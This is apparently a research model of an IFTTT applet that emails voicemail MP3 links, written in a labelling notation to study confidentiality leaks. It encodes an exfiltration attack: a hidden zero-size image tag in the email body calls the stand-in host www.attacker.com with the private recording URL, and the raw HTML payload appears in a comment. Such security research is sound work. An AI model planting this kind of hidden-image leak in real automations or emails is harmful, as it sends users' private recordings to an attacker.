//Maker: danfriedlander
//Link2Applet: https://ifttt.com/applets/774p-dictate-a-voice-memo-and-email-yourself-an-mp3-file
//Title of Applet:  Dictate a voice memo and email yourself an .mp3 file
//Trigger service: Phone Call
//Action service: Email 
//Policy/Presence:  Confidentiality of Phone Call / NO


url = urlh(lbl("PhoneCall.leaveIftttAVoicemail.Mp3Url"));
attack = imgl("www.attacker.com?" + url);
				//'<img src=\"www.attacker.com' + url + '\" style=\"width:0px;height:0px;\">';
sink('Email.sendMeEmail', 'setSubject', 'Link to Phone Call');
sink('Email.sendMeEmail', 'setBody', url + attack);
